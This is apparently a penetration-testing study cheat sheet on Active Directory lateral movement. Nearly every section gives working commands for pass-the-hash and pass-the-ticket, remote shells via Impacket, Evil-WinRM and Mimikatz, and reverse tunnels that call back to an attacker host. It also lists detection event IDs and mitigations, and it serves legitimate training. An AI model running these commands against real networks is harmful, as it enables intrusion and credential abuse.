# AD: Lateral Movement 

## 1. Requirements

**Lateral movement:** Use credentials, NTLM hashes, or Kerberos tickets to access other hosts.

- **PsExec / WMI / DCOM / SMBExec:** Usually require local administrator rights on the target.
    
- **WinRM:** Requires permission to use WinRM, commonly through `Administrators` or `Remote Management Users`.
    
- **Pass-the-Hash (PtH):** Requires a usable NT hash and a target that accepts the authentication.
    
- **Pivoting:** Requires a compromised host that can reach the internal target network.
    

**Core loop:** Move → Find credentials → Move again.

---

## 2. Check Admin Access — NetExec

**Test credentials against SMB**

```bash
nxc smb TARGET_IP -u USER -p 'PASSWORD' -d DOMAIN
```

**Check a local Administrator hash across hosts**

```bash
nxc smb IP1 IP2 -u Administrator -H NT_HASH --local-auth
```

**Important switches**

- `-u` — username or username-list file.
    
- `-p` — password or password-list file.
    
- `-H` — NT hash.
    
- `-d` — domain.
    
- `--local-auth` — authenticate against each target's local account database.
    
- `(Pwn3d!)` — indicates administrative access was confirmed.
    
- `[+]` without `(Pwn3d!)` — credentials work, but local admin access was not confirmed.

## 3. PsExec — SMB Remote Execution

**Command**

```bash
impacket-psexec DOMAIN/USER:'PASSWORD'@TARGET_IP
```

Using an NTLM hash:

```bash
impacket-psexec -hashes LM_HASH:NT_HASH DOMAIN/USER@TARGET_IP
```

If only the NT hash is available:

```bash
impacket-psexec -hashes :NT_HASH DOMAIN/USER@TARGET_IP
```

**How it works**

1. Connects over SMB (TCP 445).
    
2. Accesses `ADMIN$` and uploads a service executable.
    
3. Creates and starts a service through the Service Control Manager.
    
4. Returns an interactive shell, typically running as `NT AUTHORITY\SYSTEM`.
    
5. Stops the service and cleans up after execution.
    

**Verify**

```cmd
whoami
hostname
```

**Gotchas**

- Usually needs local admin rights, access to `ADMIN$`, and service-management permissions.
    
- Firewall rules or SMB restrictions can prevent access.
    
- PsExec writes a file and creates a service, making it comparatively noisy.
    

**Detection:** System Event ID `7045` (service installed); Security Event ID `4624` Type 3 (network logon).

## 4. Evil-WinRM — PowerShell over WinRM

WinRM commonly uses TCP `5985` (HTTP) or `5986` (HTTPS).

**Password authentication**

```bash
evil-winrm -i TARGET_IP -u USER -p 'PASSWORD'
```

**Pass-the-Hash**

```bash
evil-winrm -i TARGET_IP -u Administrator -H NT_HASH
```

**Key differences from PsExec**

- Gives a PowerShell session as the authenticated user, not automatically as SYSTEM.
    
- Supports members of `Administrators` or `Remote Management Users`, subject to configuration.
    
- Supports file upload/download and script loading.
    

**Verify**

```powershell
whoami
hostname
```

**Gotcha:** Being able to log in through WinRM does not automatically grant access to another user's protected files or an Administrator shell.

## 5. Other Remote Execution Methods

|Tool|Mechanism|Important detail|
|---|---|---|
|`wmiexec.py`|WMI/DCOM|Executes commands through WMI|
|`dcomexec.py`|DCOM|Uses COM-based remote execution|
|`smbexec.py`|SMB + service execution|Creates a service and runs commands|
|`atexec.py`|Task Scheduler RPC|Executes a command through a scheduled task|
|`xfreerdp`|RDP|Full remote desktop session|
|`nxc smb`|SMB|Quick remote command execution|

**Impacket examples**

```bash
impacket-wmiexec DOMAIN/USER:'PASSWORD'@TARGET_IP
impacket-smbexec DOMAIN/USER:'PASSWORD'@TARGET_IP
impacket-dcomexec DOMAIN/USER:'PASSWORD'@TARGET_IP
impacket-atexec DOMAIN/USER:'PASSWORD'@TARGET_IP 'whoami'
```

**NetExec command execution**

```bash
# CMD command
nxc smb TARGET_IP -u USER -p 'PASSWORD' -d DOMAIN -x 'whoami /all'

# PowerShell command
nxc smb TARGET_IP -u USER -p 'PASSWORD' -d DOMAIN -X '$PSVersionTable'
```

- `-x` — execute a command through CMD.
    
- `-X` — execute a PowerShell command.
    

**Detection references**

- `4624` Type 3 — network logon.
    
- `4648` — explicit credentials used.
    
- `7045` / `4697` — service installation.
    
- `4698` — scheduled task created.
    
- `4688` — process creation, when auditing is enabled.

## 6. Pass-the-Hash (PtH)

**Critical distinction**

|Credential material|Can be passed directly with PtH?|
|---|---|
|NT hash extracted from SAM, NTDS, or memory|Yes, when NTLM authentication is accepted|
|Captured Net-NTLMv2 challenge-response|No; crack it offline or assess relay opportunities|

A captured Net-NTLMv2 response is not the same as the underlying NT hash.

### Step 1 — Test the hash across hosts

```bash
nxc smb IP1 IP2 -u Administrator -H NT_HASH --local-auth
```

### Step 2 — Get a shell

```bash
impacket-psexec -hashes :NT_HASH Administrator@TARGET_IP
```

Or use WinRM:

```bash
evil-winrm -i TARGET_IP -u Administrator -H NT_HASH
```

**Why it works:** NTLM uses the NT hash to compute the challenge response, so the plaintext password isn't always necessary.

**Common weakness:** Reusing the same local Administrator password across machines can make one stolen hash useful on multiple hosts.

**Mitigation:** Windows LAPS, unique local admin passwords, least privilege, and restricting NTLM where practical.

## 7. Other Credential-Reuse Techniques

### Pass-the-Ticket (PtT)

Reuse a stolen Kerberos ticket.

**Mimikatz**

```text
kerberos::ptt ticket.kirbi
```

**Rubeus**

```cmd
Rubeus.exe ptt /ticket:ticket.kirbi
```

### Overpass-the-Hash / Pass-the-Key

Use an NT hash to obtain a Kerberos TGT.

**Mimikatz**

```text
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:NT_HASH /run:cmd.exe
```

### Token Impersonation

If running with sufficient privileges and a suitable logged-on token exists:

```text
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\Administrator"
```

**Key point:** These techniques require different prerequisites. A hash, a captured challenge-response, a Kerberos ticket, and a Windows access token are not interchangeable.

## 8. SSH Pivoting — Local Port Forward

Use a reachable Linux host as a relay to reach an internal service.

**Forward local port 13389 to the DC's RDP port**

```bash
ssh -L 13389:DC_IP:3389 USER@PIVOT_IP -N
```

- `-L LOCAL_PORT:DEST_IP:DEST_PORT` — local port forwarding.
    
- `-N` — don't execute a remote command; keep the tunnel open.
    

Connect through the tunnel from a second terminal:

```bash
xfreerdp /v:127.0.0.1:13389 /u:USER /p:'PASSWORD' /cert:ignore
```

**Remember:** `127.0.0.1:13389` is your local tunnel endpoint. SSH connects from the pivot host to the internal DC.

## 9. SSH Dynamic Port Forwarding — SOCKS Proxy

**Create a SOCKS proxy**

```bash
ssh -f -D 1080 USER@PIVOT_IP -N
```

- `-D 1080` — dynamic forwarding; creates a SOCKS proxy on local port 1080.
    
- `-f` — runs SSH in the background after authentication.
    
- `-N` — no remote shell.
    

### Configure ProxyChains

Edit `/etc/proxychains4.conf` or the installed `proxychains.conf`, and configure the proxy list:

```text
[ProxyList]
socks4 127.0.0.1 1080
```

**Test an internal web service**

```bash
proxychains curl -s http://INTERNAL_IP | head -20
```

**Reach the DC through the proxy**

```bash
proxychains nxc smb DC_IP -u Administrator -H NT_HASH
```

**Get a shell through the proxy**

```bash
proxychains impacket-psexec -hashes :NT_HASH DOMAIN/Administrator@DC_IP
```

### ProxyChains gotchas

- Supports TCP traffic, not UDP or ICMP.
    
- For Nmap through SOCKS, use TCP connect scans and skip host discovery:
    
    ```bash
    proxychains nmap -sT -Pn -p 445,3389 TARGET_IP
    ```
    
- SOCKS-aware DNS resolution may require enabling `proxy_dns` in the configuration.
    
- The pivot host must have network access to the destination service.
    

**Mnemonic:** `-L` = forward one specific service; `-D` = SOCKS proxy for multiple destinations.

## 10. Other Pivoting Tools

### Chisel

**AttackBox — server**

```bash
chisel server --port 8080 --reverse
```

**Compromised host — client**

```cmd
chisel.exe client ATTACKBOX_IP:8080 R:1080:socks
```

Creates a reverse SOCKS tunnel. The Chisel server/client configuration and network reachability must match.

### Ligolo-ng

**AttackBox — proxy**

```bash
sudo ./proxy -selfcert
```

**Pivot host — agent**

```bash
./agent -connect ATTACKBOX_IP:11601 -accept-fingerprint FINGERPRINT
```

**AttackBox — route internal subnet**

```bash
sudo ip route add INTERNAL_SUBNET/CIDR dev ligolo
```

After configuring the Ligolo interface and route, tools can access the routed network without ProxyChains. Interface setup and agent/session configuration are also required.
